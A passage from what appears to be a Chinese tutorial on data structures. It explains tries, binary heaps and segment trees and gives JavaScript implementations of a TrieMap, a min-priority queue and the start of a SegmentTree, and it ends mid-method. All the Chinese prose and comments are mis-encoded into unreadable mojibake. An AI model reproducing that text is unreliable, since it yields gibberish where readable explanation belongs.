<h4 data-id="heading-8">2.3 æ ¸å¿ƒä¼˜åŠ¿ä¸åº”ç”¨åœºæ™¯</h4>
<p>ç›¸æ¯”å“ˆå¸Œè¡¨ã€çº¢é»‘æ ‘ï¼ŒTrieæ ‘çš„ç‹¬ç‰¹ä¼˜åŠ¿æ˜¯ã€Œå‰ç¼€æ“ä½œé«˜æ•ˆã€ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p>
<ol>
<li>
<p>èŠ‚çœå­˜å‚¨ç©ºé—´ï¼šå…¬å…±å‰ç¼€ä»…å­˜å‚¨ä¸€æ¬¡ï¼Œé€‚åˆå¤§é‡é‡å¤å‰ç¼€çš„å­—ç¬¦ä¸²ï¼ˆå¦‚è¯ä»¶å·ã€å•è¯è¯å…¸ï¼‰ï¼›</p>
</li>
<li>
<p>å‰ç¼€æ“ä½œé«˜æ•ˆï¼šæœ€çŸ­å‰ç¼€åŒ¹é…ã€æœ€é•¿å‰ç¼€åŒ¹é…ã€å‰ç¼€æŸ¥é‡ç­‰æ“ä½œï¼Œæ—¶é—´å¤æ‚åº¦å‡ä¸ºO(L)ï¼ˆLä¸ºå‰ç¼€é•¿åº¦ï¼‰ï¼›</p>
</li>
<li>
<p>æ”¯æŒé€šé…ç¬¦åŒ¹é…ï¼ˆå¦‚"t.a."åŒ¹é…"that"ã€"team"ï¼‰ï¼Œé€‚åˆæœç´¢å¼•æ“å…³é”®è¯åŒ¹é…ï¼›</p>
</li>
<li>
<p>æ”¯æŒå­—å…¸åºéå†ï¼Œä¸çº¢é»‘æ ‘æŒå¹³ï¼Œä½†ä¼˜äºå“ˆå¸Œè¡¨ã€‚</p>
</li>
</ol>
<p>åŸºäºä»¥ä¸Šä¼˜åŠ¿ï¼ŒTrieæ ‘çš„å…¸å‹åº”ç”¨åœºæ™¯ååˆ†å¹¿æ³›ï¼Œä¸»è¦é›†ä¸­åœ¨å­—ç¬¦ä¸²ç›¸å…³å¤„ç†é¢†åŸŸï¼š</p>
<ul>
<li>
<p>è‡ªåŠ¨è¡¥å…¨ï¼ˆè¾“å…¥æ³•ã€æœç´¢å¼•æ“ï¼‰ï¼›</p>
</li>
<li>
<p>æ‹¼å†™æ£€æŸ¥ã€å‰ç¼€æŸ¥é‡ï¼ˆå¦‚ç”¨æˆ·åå‰ç¼€æ ¡éªŒï¼‰ï¼›</p>
</li>
<li>
<p>å­—å…¸åºæ’åºã€è¯é¢‘ç»Ÿè®¡ï¼›</p>
</li>
<li>
<p>é€šé…ç¬¦åŒ¹é…ï¼ˆç®€å•çš„å…³é”®è¯æœç´¢ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-9">2.4 æ ¸å¿ƒä»£ç å®ç°ï¼ˆç®€åŒ–ç‰ˆTrieMapï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Trieæ ‘èŠ‚ç‚¹</span>
<span class="hljs-keyword">var</span> <span class="hljs-title class_">TrieNode</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// å­˜å‚¨é”®å¯¹åº”çš„å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">children</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">256</span>); <span class="hljs-comment">// é€‚é…æ‰€æœ‰ASCIIå­—ç¬¦</span>
};

<span class="hljs-comment">// TrieMapæ ¸å¿ƒå®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">var</span> <span class="hljs-title class_">TrieMap</span> = <span class="hljs-keyword">class</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrieNode</span>(); <span class="hljs-comment">// æ ¹èŠ‚ç‚¹ï¼ˆç©ºå­—ç¬¦ï¼‰</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// é”®å€¼å¯¹æ•°é‡</span>
    }

    <span class="hljs-comment">// æ’å…¥é”®å€¼å¯¹</span>
    <span class="hljs-title function_">put</span>(<span class="hljs-params">key, val</span>) {
        <span class="hljs-keyword">let</span> node = <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> key) {
            <span class="hljs-keyword">const</span> idx = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// å­—ç¬¦è½¬ASCIIç´¢å¼•</span>
            <span class="hljs-keyword">if</span> (!node.<span class="hljs-property">children</span>[idx]) {
                node.<span class="hljs-property">children</span>[idx] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrieNode</span>();
            }
            node = node.<span class="hljs-property">children</span>[idx];
        }
        node.<span class="hljs-property">val</span> = val;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
    }

    <span class="hljs-comment">// æŸ¥è¯¢é”®å¯¹åº”çš„å€¼</span>
    <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) {
        <span class="hljs-keyword">let</span> node = <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> key) {
            <span class="hljs-keyword">const</span> idx = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">if</span> (!node.<span class="hljs-property">children</span>[idx]) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            node = node.<span class="hljs-property">children</span>[idx];
        }
        <span class="hljs-keyword">return</span> node.<span class="hljs-property">val</span>;
    }

    <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‰ç¼€ä¸ºprefixçš„é”®</span>
    <span class="hljs-title function_">hasKeyWithPrefix</span>(<span class="hljs-params">prefix</span>) {
        <span class="hljs-keyword">let</span> node = <span class="hljs-variable language_">this</span>.<span class="hljs-property">root</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c <span class="hljs-keyword">of</span> prefix) {
            <span class="hljs-keyword">const</span> idx = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">if</span> (!node.<span class="hljs-property">children</span>[idx]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
            node = node.<span class="hljs-property">children</span>[idx];
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-comment">// è·å–é”®å€¼å¯¹æ•°é‡</span>
    <span class="hljs-title function_">size</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>;
    }
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">const</span> trie = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrieMap</span>();
trie.<span class="hljs-title function_">put</span>(<span class="hljs-string">"apple"</span>, <span class="hljs-number">1</span>);
trie.<span class="hljs-title function_">put</span>(<span class="hljs-string">"app"</span>, <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(trie.<span class="hljs-title function_">get</span>(<span class="hljs-string">"apple"</span>)); <span class="hljs-comment">// 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(trie.<span class="hljs-title function_">hasKeyWithPrefix</span>(<span class="hljs-string">"app"</span>)); <span class="hljs-comment">// true</span>
    
</code></pre>
<h3 data-id="heading-10">ä¸‰ã€äºŒå‰å †ï¼šåŠ¨æ€æ’åºçš„æ ¸å¿ƒï¼ˆä¼˜å…ˆçº§é˜Ÿåˆ—åº•å±‚ï¼‰</h3>
<h4 data-id="heading-11">3.1 æ ¸å¿ƒå®šä½</h4>
<p>äºŒå‰å †æ˜¯ä¸€ç§ç‰¹æ®Šçš„å®Œå…¨äºŒå‰æ ‘ï¼Œæ ¸å¿ƒåŠŸèƒ½æ˜¯ã€ŒåŠ¨æ€æ’åºã€â€”â€”å¯ä¸æ–­æ’å…¥ã€åˆ é™¤å…ƒç´ ï¼Œä¸”ç»“æ„ä¼šè‡ªåŠ¨è°ƒæ•´ï¼Œç¡®ä¿å§‹ç»ˆèƒ½å¿«é€Ÿè·å–æœ€å€¼ï¼ˆæœ€å¤§å€¼/æœ€å°å€¼ï¼‰ã€‚å®ƒçš„æ ¸å¿ƒæ“ä½œåªæœ‰ä¸¤ä¸ªï¼šswimï¼ˆä¸Šæµ®ï¼‰å’Œsinkï¼ˆä¸‹æ²‰ï¼‰ï¼Œæ­£æ˜¯è¿™ä¸¤ä¸ªæ“ä½œç»´æŠ¤äº†å †çš„æ ¸å¿ƒæ€§è´¨ã€‚</p>
<p>äºŒå‰å †çš„ä¸¤å¤§æ ¸å¿ƒåº”ç”¨ï¼šä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆåº•å±‚å®ç°ï¼‰ã€å †æ’åºç®—æ³•ã€‚</p>
<h4 data-id="heading-12">3.2 æ ¸å¿ƒåŸç†</h4>
<p>äºŒå‰å †åˆ†ä¸ºä¸¤ç§ï¼Œæ ¸å¿ƒæ€§è´¨å›´ç»•ã€Œçˆ¶å­èŠ‚ç‚¹å¤§å°å…³ç³»ã€ï¼š</p>
<ul>
<li>
<p>å°é¡¶å †ï¼šä»»æ„èŠ‚ç‚¹çš„å€¼ â‰¤ å…¶å·¦å³å­èŠ‚ç‚¹çš„å€¼ï¼Œæ ¹èŠ‚ç‚¹æ˜¯æœ€å°å€¼ï¼›</p>
</li>
<li>
<p>å¤§é¡¶å †ï¼šä»»æ„èŠ‚ç‚¹çš„å€¼ â‰¥ å…¶å·¦å³å­èŠ‚ç‚¹çš„å€¼ï¼Œæ ¹èŠ‚ç‚¹æ˜¯æœ€å¤§å€¼ã€‚</p>
</li>
</ul>
<p>å…³é”®ç‰¹æ€§ï¼šäºŒå‰å †æ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œå› æ­¤å¯ä»¥ç”¨ã€Œæ•°ç»„ã€åŸåœ°æ¨¡æ‹Ÿï¼ˆæ— éœ€åˆ›å»ºTreeNodeï¼‰ï¼Œé€šè¿‡ç´¢å¼•è®¡ç®—çˆ¶å­èŠ‚ç‚¹ä½ç½®ï¼Œæ•ˆç‡æ›´é«˜ï¼š</p>
<ul>
<li>
<p>çˆ¶èŠ‚ç‚¹ç´¢å¼•ï¼šMath.floor((nodeIndex - 1) / 2)ï¼›</p>
</li>
<li>
<p>å·¦å­èŠ‚ç‚¹ç´¢å¼•ï¼šnodeIndex * 2 + 1ï¼›</p>
</li>
<li>
<p>å³å­èŠ‚ç‚¹ç´¢å¼•ï¼šnodeIndex * 2 + 2ã€‚</p>
</li>
</ul>
<p>æ ¸å¿ƒæ“ä½œè§£æï¼ˆå°é¡¶å †ä¸ºä¾‹ï¼‰ï¼š</p>
<ol>
<li>
<p>pushï¼ˆæ’å…¥å…ƒç´ ï¼‰ï¼šæ–°å…ƒç´ è¿½åŠ åˆ°æ•°ç»„æœ«å°¾ï¼ˆå®Œå…¨äºŒå‰æ ‘æœ€å³ä¾§ï¼‰ï¼Œæ‰§è¡Œswimï¼ˆä¸Šæµ®ï¼‰â€”â€”ä¸çˆ¶èŠ‚ç‚¹æ¯”è¾ƒï¼Œè‹¥æ›´å°åˆ™äº¤æ¢ï¼Œç›´åˆ°æ»¡è¶³å°é¡¶å †æ€§è´¨æˆ–åˆ°è¾¾æ ¹èŠ‚ç‚¹ï¼›</p>
</li>
<li>
<p>popï¼ˆåˆ é™¤å †é¡¶ï¼‰ï¼šç”¨æ•°ç»„æœ«å°¾å…ƒç´ è¦†ç›–å †é¡¶ï¼Œæ‰§è¡Œsinkï¼ˆä¸‹æ²‰ï¼‰â€”â€”ä¸å·¦å³å­èŠ‚ç‚¹ä¸­çš„æœ€å°å€¼æ¯”è¾ƒï¼Œè‹¥æ›´å¤§åˆ™äº¤æ¢ï¼Œç›´åˆ°æ»¡è¶³å°é¡¶å †æ€§è´¨æˆ–åˆ°è¾¾å¶å­èŠ‚ç‚¹ï¼›</p>
</li>
<li>
<p>peekï¼ˆæŸ¥çœ‹å †é¡¶ï¼‰ï¼šç›´æ¥è¿”å›æ•°ç»„[0]ï¼ˆæ ¹èŠ‚ç‚¹ï¼‰ï¼Œæ—¶é—´å¤æ‚åº¦O(1)ã€‚è¿™ä¸‰å¤§æ“ä½œå…±åŒæ”¯æ’‘èµ·äºŒå‰å †åŠ¨æ€æ’åºã€å¿«é€Ÿå–æœ€å€¼çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä¸‹æ–‡çš„ä»£ç å®ç°ä¹Ÿå°†å›´ç»•è¿™ä¸‰ä¸ªæ“ä½œå±•å¼€ï¼Œç›´è§‚å‘ˆç°å…¶å·¥ä½œé€»è¾‘ã€‚</p>
</li>
</ol>
<h4 data-id="heading-13">3.3 æ ¸å¿ƒä»£ç å®ç°ï¼ˆå°é¡¶å †+ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleMinPQ</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">capacity</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span> = capacity; <span class="hljs-comment">// å †æœ€å¤§å®¹é‡</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span> = []; <span class="hljs-comment">// æ•°ç»„æ¨¡æ‹Ÿå †</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// å®é™…å…ƒç´ æ•°</span>
  }

  <span class="hljs-comment">// è·å–å †å¤§å°</span>
  <span class="hljs-title function_">size</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span>;
  }

  <span class="hljs-comment">// æŸ¥çœ‹å †é¡¶ï¼ˆæœ€å°å€¼ï¼‰</span>
  <span class="hljs-title function_">peek</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[<span class="hljs-number">0</span>];
  }

  <span class="hljs-comment">// æ’å…¥å…ƒç´ </span>
  <span class="hljs-title function_">push</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">capacity</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'heap is full'</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span>] = val; <span class="hljs-comment">// è¿½åŠ åˆ°æœ«å°¾</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">swim</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span>); <span class="hljs-comment">// ä¸Šæµ®è°ƒæ•´</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span>++;
  }

  <span class="hljs-comment">// åˆ é™¤å¹¶è¿”å›å †é¡¶</span>
  <span class="hljs-title function_">pop</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">throw</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'heap is empty'</span>);
    <span class="hljs-keyword">const</span> minValue = <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[<span class="hljs-number">0</span>]; <span class="hljs-comment">// ä¿å­˜å †é¡¶å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span> - <span class="hljs-number">1</span>]; <span class="hljs-comment">// å †å°¾è¦†ç›–å †é¡¶</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sink</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// ä¸‹æ²‰è°ƒæ•´</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span>--;
    <span class="hljs-keyword">return</span> minValue;
  }

  <span class="hljs-comment">// ä¸Šæµ®ï¼šæ–°å…ƒç´ å‘ä¸Šè°ƒæ•´</span>
  <span class="hljs-title function_">swim</span>(<span class="hljs-params">nodeIndex</span>) {
    <span class="hljs-keyword">while</span> (nodeIndex !== <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[nodeIndex] &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">parentIndex</span>(nodeIndex)]) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">swap</span>(nodeIndex, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">parentIndex</span>(nodeIndex));
      nodeIndex = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">parentIndex</span>(nodeIndex);
    }
  }

  <span class="hljs-comment">// ä¸‹æ²‰ï¼šå †é¡¶å…ƒç´ å‘ä¸‹è°ƒæ•´</span>
  <span class="hljs-title function_">sink</span>(<span class="hljs-params">nodeIndex</span>) {
    <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">leftChildIndex</span>(nodeIndex) &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span>) {
      <span class="hljs-keyword">let</span> minChildIndex = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">leftChildIndex</span>(nodeIndex);
      <span class="hljs-keyword">const</span> rightChildIndex = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">rightChildIndex</span>(nodeIndex);
      <span class="hljs-comment">// æ‰¾åˆ°å·¦å³å­èŠ‚ç‚¹ä¸­çš„æœ€å°å€¼</span>
      <span class="hljs-keyword">if</span> (rightChildIndex &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">_size</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[rightChildIndex] &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[minChildIndex]) {
        minChildIndex = rightChildIndex;
      }
      <span class="hljs-comment">// æ»¡è¶³å †æ€§è´¨ï¼Œåœæ­¢ä¸‹æ²‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[nodeIndex] &lt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[minChildIndex]) <span class="hljs-keyword">break</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">swap</span>(nodeIndex, minChildIndex);
      nodeIndex = minChildIndex;
    }
  }

  <span class="hljs-comment">// äº¤æ¢ä¸¤ä¸ªèŠ‚ç‚¹</span>
  <span class="hljs-title function_">swap</span>(<span class="hljs-params">index1, index2</span>) {
    [<span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[index1], <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[index2]] = [<span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[index2], <span class="hljs-variable language_">this</span>.<span class="hljs-property">heap</span>[index1]];
  }

  <span class="hljs-comment">// çˆ¶èŠ‚ç‚¹ç´¢å¼•</span>
  <span class="hljs-title function_">parentIndex</span>(<span class="hljs-params">nodeIndex</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((nodeIndex - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>);
  }

  <span class="hljs-comment">// å·¦å­èŠ‚ç‚¹ç´¢å¼•</span>
  <span class="hljs-title function_">leftChildIndex</span>(<span class="hljs-params">nodeIndex</span>) {
    <span class="hljs-keyword">return</span> nodeIndex * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// å³å­èŠ‚ç‚¹ç´¢å¼•</span>
  <span class="hljs-title function_">rightChildIndex</span>(<span class="hljs-params">nodeIndex</span>) {
    <span class="hljs-keyword">return</span> nodeIndex * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>;
  }
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">const</span> pq = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMinPQ</span>(<span class="hljs-number">6</span>);
pq.<span class="hljs-title function_">push</span>(<span class="hljs-number">1</span>);
pq.<span class="hljs-title function_">push</span>(<span class="hljs-number">5</span>);
pq.<span class="hljs-title function_">push</span>(<span class="hljs-number">7</span>);
pq.<span class="hljs-title function_">push</span>(<span class="hljs-number">8</span>);
pq.<span class="hljs-title function_">push</span>(<span class="hljs-number">3</span>);
pq.<span class="hljs-title function_">push</span>(<span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pq.<span class="hljs-title function_">peek</span>()); <span class="hljs-comment">// 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pq.<span class="hljs-title function_">pop</span>()); <span class="hljs-comment">// 1ï¼ˆåˆ é™¤å †é¡¶ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pq.<span class="hljs-title function_">size</span>()); <span class="hljs-comment">// 5</span>
    
</code></pre>
<h4 data-id="heading-14">3.4 åº”ç”¨åœºæ™¯</h4>
<p>ç»“åˆäºŒå‰å †åŠ¨æ€æ’åºã€å¿«é€Ÿå–æœ€å€¼çš„æ ¸å¿ƒç‰¹æ€§ï¼Œå…¶åº”ç”¨åœºæ™¯ä¸»è¦é›†ä¸­åœ¨éœ€è¦åŠ¨æ€ç»´æŠ¤æœ‰åºæ•°æ®ã€å¿«é€Ÿè·å–æœ€å€¼çš„åœºæ™¯ï¼š</p>
<ul>
<li>
<p>ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆä»»åŠ¡è°ƒåº¦ã€TopKé—®é¢˜ã€ä¸­ä½æ•°é—®é¢˜ï¼‰ï¼›</p>
</li>
<li>
<p>å †æ’åºï¼ˆæ—¶é—´å¤æ‚åº¦O(NlogN)ï¼ŒåŸåœ°æ’åºï¼‰ï¼›</p>
</li>
<li>
<p>åŠ¨æ€è·å–æœ€å€¼ï¼ˆå¦‚å®æ—¶æ•°æ®çš„æœ€å¤§å€¼/æœ€å°å€¼ç›‘æ§ï¼‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-15">å››ã€çº¿æ®µæ ‘ï¼šåŒºé—´æŸ¥è¯¢ä¸æ›´æ–°çš„ç¥å™¨</h3>
<h4 data-id="heading-16">4.1 æ ¸å¿ƒå®šä½</h4>
<p>çº¿æ®µæ ‘æ˜¯äºŒå‰æ ‘è¡ç”Ÿçš„ä¸€ç§ç‰¹æ®Šç»“æ„ï¼Œæ ¸å¿ƒè§£å†³ã€Œæ•°ç»„åŒºé—´æŸ¥è¯¢+åŠ¨æ€æ›´æ–°ã€çš„é—®é¢˜ã€‚æ™®é€šå‰ç¼€å’Œã€åç¼€å’Œè™½èƒ½å¿«é€ŸæŸ¥è¯¢åŒºé—´å’Œï¼Œä½†æ›´æ–°å…ƒç´ æ—¶æ•ˆç‡æä½ï¼ˆO(N)ï¼‰ï¼›è€Œçº¿æ®µæ ‘èƒ½å°†ã€ŒåŒºé—´æŸ¥è¯¢ã€å’Œã€Œå•ç‚¹/åŒºé—´æ›´æ–°ã€çš„æ—¶é—´å¤æ‚åº¦å‡ç¨³å®šåœ¨O(logN)ï¼Œæ˜¯å¤„ç†åŒºé—´é—®é¢˜çš„æœ€ä¼˜ç»“æ„ä¹‹ä¸€ã€‚</p>
<h4 data-id="heading-17">4.2 æ ¸å¿ƒåŸç†</h4>
<p>çº¿æ®µæ ‘çš„æ ¸å¿ƒæ€æƒ³æ˜¯ã€Œåˆ†æ²»+é¢„å¤„ç†ã€ï¼šå°†åŸæ•°ç»„çš„åŒºé—´ä¸æ–­æ‹†åˆ†ï¼Œæ¯ä¸ªèŠ‚ç‚¹å¯¹åº”ä¸€ä¸ªåŒºé—´ï¼Œå­˜å‚¨è¯¥åŒºé—´çš„ã€Œèšåˆå€¼ã€ï¼ˆå’Œã€æœ€å€¼ã€ç§¯ç­‰ï¼‰ï¼ŒæŸ¥è¯¢/æ›´æ–°æ—¶åªéœ€æ“ä½œç›¸å…³åŒºé—´ï¼Œæ— éœ€éå†æ•´ä¸ªæ•°ç»„ã€‚</p>
<p>æ ¸å¿ƒæ“ä½œè§£æï¼š</p>
<ol>
<li>
<p>æ„å»ºï¼ˆbuildï¼‰ï¼šé€’å½’æ‹†åˆ†åŒºé—´ï¼Œéå¶å­èŠ‚ç‚¹çš„èšåˆå€¼ = å·¦å­èŠ‚ç‚¹èšåˆå€¼ + å³å­èŠ‚ç‚¹èšåˆå€¼ï¼ˆæ±‚å’Œåœºæ™¯ï¼‰ï¼Œå¶å­èŠ‚ç‚¹å¯¹åº”åŸæ•°ç»„å…ƒç´ ï¼›</p>
</li>
<li>
<p>åŒºé—´æŸ¥è¯¢ï¼ˆqueryï¼‰ï¼šé€’å½’åˆ¤æ–­å½“å‰èŠ‚ç‚¹åŒºé—´ä¸ç›®æ ‡åŒºé—´çš„å…³ç³»ï¼Œåˆ†ä¸ºã€Œå®Œå…¨ä¸é‡å ï¼ˆè¿”å›ä¸­æ€§å€¼ï¼Œå¦‚æ±‚å’Œè¿”å›0ï¼‰ã€ã€Œå®Œå…¨é‡å ï¼ˆè¿”å›å½“å‰èŠ‚ç‚¹å€¼ï¼‰ã€ã€Œéƒ¨åˆ†é‡å ï¼ˆåˆ†æ²»æŸ¥è¯¢å·¦å³å­æ ‘ï¼Œåˆå¹¶ç»“æœï¼‰ã€ï¼›</p>
</li>
<li>
<p>å•ç‚¹æ›´æ–°ï¼ˆupdateï¼‰ï¼šæ‰¾åˆ°ç›®æ ‡å¶å­èŠ‚ç‚¹ï¼Œæ›´æ–°å…¶å€¼ï¼Œå†å‘ä¸Šå›æº¯ï¼Œæ›´æ–°æ‰€æœ‰çˆ¶èŠ‚ç‚¹çš„èšåˆå€¼ï¼ˆç¡®ä¿åŒºé—´å€¼æ­£ç¡®ï¼‰ã€‚è¿™ä¸‰ä¸ªæ“ä½œç›¸è¾…ç›¸æˆï¼Œå®ç°äº†çº¿æ®µæ ‘é«˜æ•ˆå¤„ç†åŒºé—´é—®é¢˜çš„æ ¸å¿ƒèƒ½åŠ›ï¼Œä¸‹æ–‡å°†é€šè¿‡ä»£ç å®ç°ï¼Œå…·ä½“å±•ç¤ºå…¶æ“ä½œé€»è¾‘ã€‚</p>
</li>
</ol>
<h4 data-id="heading-18">4.3 æ ¸å¿ƒä»£ç å®ç°ï¼ˆæ±‚å’Œåœºæ™¯ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SegmentTree</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">nums</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span> = nums.<span class="hljs-property">length</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">4</span> * <span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span>); <span class="hljs-comment">// çº¿æ®µæ ‘æ•°ç»„ï¼Œå¼€4*nè¶³å¤Ÿ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">build</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">n</span> - <span class="hljs-number">1</span>, nums); <span class="hljs-comment">// æ„å»ºçº¿æ®µæ ‘</span>
  }

  <span class="hljs-comment">// æ„å»ºçº¿æ®µæ ‘ï¼ˆnodeï¼šå½“å‰èŠ‚ç‚¹ç´¢å¼•ï¼Œl/rï¼šå½“å‰èŠ‚ç‚¹è¦†ç›–åŒºé—´ï¼‰</span>
  <span class="hljs-title function_">build</span>(<span class="hljs-params">node, l, r, nums</span>) {
    <span class="hljs-keyword">if</span> (l === r) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tree</span>[node] = nums[l]; <span class="hljs-comment">// å¶å­èŠ‚ç‚¹ï¼Œå­˜å‚¨åŸæ•°ç»„å€¼</span>
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((l + r) / <span class="hljs-number">2</span>);
    <span class="hljs-keyword">const</span> leftChild = <span class="hljs-number">2</span> * node + <span class="hljs-number">1</span>;
    <span class="hljs-keyword">const</span> rightChild = <span class="hljs-number">2</span> * node + <span class="hljs-number">2</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">build</span>(leftChild, l, mid, nums); <span class="hljs-comment">// é€’å½’æ„å»ºå·¦å­æ ‘</span>
